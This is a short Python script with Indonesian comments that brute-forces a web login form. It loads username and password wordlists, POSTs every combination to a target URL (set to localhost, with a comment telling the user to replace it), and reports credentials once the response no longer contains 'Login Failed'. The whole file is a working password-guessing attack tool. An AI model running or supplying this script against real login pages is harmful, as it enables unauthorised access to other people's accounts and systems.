import requests

TARGET_URL = "http://localhost/login"  # Ganti dengan URL target
FAILED_TEXT = "Login Failed"  # Teks yang menandakan login gagal

def load_wordlist(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[!] Wordlist file '{file_path}' not found.")
        return []

def brute_force(usernames, passwords):
    for username in usernames:
        for password in passwords:
            print(f"[*] Trying: {username}:{password}")
            data = {
                "username": username,
                "password": password
            }

            response = requests.post(TARGET_URL, data=data)
            
            if FAILED_TEXT not in response.text:
                print(f"[+] SUCCESS! => Username: '{username}' | Password: '{password}'")
                return True
            else:
                print("[-] Failed.")
    print("[x] Brute force completed. No valid credentials found.")
    return False

if __name__ == "__main__":
    usernames = load_wordlist("usernames.txt")
    passwords = load_wordlist("passwords.txt")
    
    if usernames and passwords:
        brute_force(usernames, passwords)
    else:
        print("[!] Username or password list is empty.")
